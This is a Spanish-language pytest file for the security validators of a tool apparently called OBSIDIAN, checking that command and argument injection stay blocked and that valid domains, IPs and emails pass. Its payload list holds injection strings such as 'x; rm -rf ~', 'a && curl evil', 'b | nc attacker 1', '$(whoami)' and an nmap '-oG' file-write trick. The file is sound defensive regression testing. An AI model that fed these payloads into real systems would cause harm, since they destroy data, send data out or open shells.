"""Tests de los validadores de seguridad de OBSIDIAN.

Objetivo: que las vulnerabilidades cerradas (command injection y argument
injection) NO puedan volver sin que un test grite. Roadmap F0 · paso 12.

Correr:  ../.venv/bin/python -m pytest test_seguridad.py -q
"""
import obsidian_web as ob


# ── argument injection: el exploit exacto de la auditoría del 25-jul ──────────
def test_argument_injection_nmap_bloqueada():
    # ip = "-oG/home/user/.bashrc" hacía que nmap escribiera archivos.
    assert ob._validar('-oG/home/user/.bashrc', 'ip') is False
    assert ob._validar('-oN/tmp/x', 'ip') is False
    assert ob._objetivo_seguro('-oG/algo') is False  # check genérico también


# ── command injection: metacaracteres de shell ───────────────────────────────
def test_command_injection_bloqueada():
    payloads = [
        'x; rm -rf ~', 'a && curl evil', 'b | nc attacker 1', '`id`',
        '$(whoami)', 'foo\nbar', 'a > /etc/passwd', "q' OR '1'='1",
    ]
    for p in payloads:
        assert ob._validar(p, 'dominio') is False, p
        assert ob._validar(p, 'ip') is False, p
        assert ob._objetivo_seguro(p) is False, p


# ── allowlist: lo legítimo SÍ pasa ───────────────────────────────────────────
def test_objetivos_validos_pasan():
    assert ob._validar('example.com', 'dominio')
    assert ob._validar('sub.example.co.uk', 'dominio')
    assert ob._validar('8.8.8.8', 'ip')
    assert ob._validar('2001:4860:4860::8888', 'ip')
    assert ob._validar('user_name-1.x', 'usuario')
    assert ob._validar('a@b.com', 'email')


# ── casos borde: vacío, guion inicial, espacios ──────────────────────────────
def test_bordes():
    assert ob._validar('', 'dominio') is False
    assert ob._validar('   ', 'ip') is False
    assert ob._validar('-example.com', 'dominio') is False   # guion inicial
    assert ob._validar('exam ple.com', 'dominio') is False   # espacio
    assert ob._validar('a' * 300, 'dominio') is False         # demasiado largo
    assert ob._es_ip('999.999.999.999') is False


# ── el mapa módulo→tipo cubre todos los módulos que tocan shell ──────────────
def test_modulos_shell_tienen_tipo():
    for mod in ('usuario', 'dominio', 'ip', 'email', 'ssl', 'typosquatting', 'takeover'):
        assert mod in ob._MODULO_TIPO
